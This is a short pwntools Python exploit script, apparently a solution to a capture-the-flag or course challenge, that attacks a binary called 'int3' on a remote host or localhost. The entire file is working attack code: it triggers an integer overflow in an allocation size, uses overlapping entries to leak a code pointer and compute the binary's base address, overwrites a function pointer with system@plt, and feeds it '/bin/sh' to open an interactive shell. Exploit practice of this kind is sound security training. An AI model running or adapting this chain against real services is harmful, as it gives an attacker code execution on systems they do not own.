from pwn import *

def get_process():
    if args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4471)
    else:
        return remote('localhost', 4471)
    
context.log_level = 'debug'
elf = ELF('./int3')
context.binary = elf

p = get_process()

p.recvline() # discard welcome message
p.sendline(b'oa' + str(2**60).encode()) # 2**60 * 16 = 2**64 = 0 (mod 2**64) --> overflow
p.recvline() # discard response
p.sendline(b'oeg0') # create an executable entry just after the previous one
p.recvline() # discard response

p.sendline(b'r0,2') # read the first entry which overlaps the pointer to the second entry
leak = p.recvline().strip()
leaked_addr = u64(leak.ljust(8, b'\x00'))
log.success(f'Leaked address: {hex(leaked_addr)}')


elf.address = leaked_addr - elf.symbols['ExecObj_Grep_run']
log.success(f'Calculated base address: {hex(elf.address)}')

system_plt = elf.plt['system']
log.success(f'system@plt address: {hex(system_plt)}')
p.sendline(b'a0,2=' + p64(system_plt)) # overwrite the pointer to the second entry with system@plt
p.sendline(b'a0,0=/bin/sh')
p.sendline(b'r1') # trigger the second entry, which now points to system@plt
p.interactive()